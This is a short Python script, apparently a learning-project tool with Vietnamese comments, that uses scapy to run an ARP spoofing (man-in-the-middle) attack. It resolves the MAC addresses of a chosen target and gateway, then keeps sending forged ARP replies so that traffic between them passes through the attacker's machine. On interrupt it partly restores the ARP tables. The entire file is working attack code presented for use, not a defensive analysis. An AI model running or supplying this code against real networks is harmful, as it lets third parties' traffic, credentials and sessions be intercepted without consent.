#!/usr/bin/env python3
from asyncio import exceptions

from logging import exception
import sys
from tabnanny import verbose
from time import sleep
import time
import scapy.all as scapy
import argparse
def get_options():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="IP 's target")
    parser.add_argument("-g","--gateway",dest ="gateway",help ="IP 's gateway")
    options=parser.parse_args()
    return options
def get_mac(ip):
    #tao goi arp va ethernet
    arp_request = scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #ket hop 2 goi tin de gui cho toan mang 
    arp_request_broascast=broadcast/arp_request
    #gui goi tin va nhan ve phan hoi 
    answered_list=scapy.srp(arp_request_broascast,timeout= 1,verbose=False)[0]
    print(answered_list)
    return answered_list[0][1].hwsrc
def spoof(ip_target, ip_spoof):
    target_mac=get_mac(ip_target )
    packet=scapy.ARP(op=2, pdst=ip_target,hwdst=target_mac, psrc=ip_spoof)
    scapy.send(packet)
    
def restore(  ip_dst, ip_src):
    mac_dst=get_mac(ip_dst)
    mac_src=get_mac(ip_src)
    packet=scapy.ARP(op=2,pdst=ip_dst,hwdst=mac_dst,psrc=ip_src,hwsrc=mac_src)
    scapy.send(packet,count=4,verbose=False)


options=get_options()
target_ip=options.target
geteway_ip=options.gateway
sent_packet_count=0
try :
    while True:
        spoof(target_ip,geteway_ip)
        spoof(geteway_ip,target_ip)
        print ("\r[+] Packets sent "+ str(sent_packet_count),end ="")
        sent_packet_count += 2
        sys.stdout.flush()
        time,sleep(2)

except KeyboardInterrupt:
    print ("Detected by CTL + C ... Quitting ")
    restore(target_ip,geteway_ip)
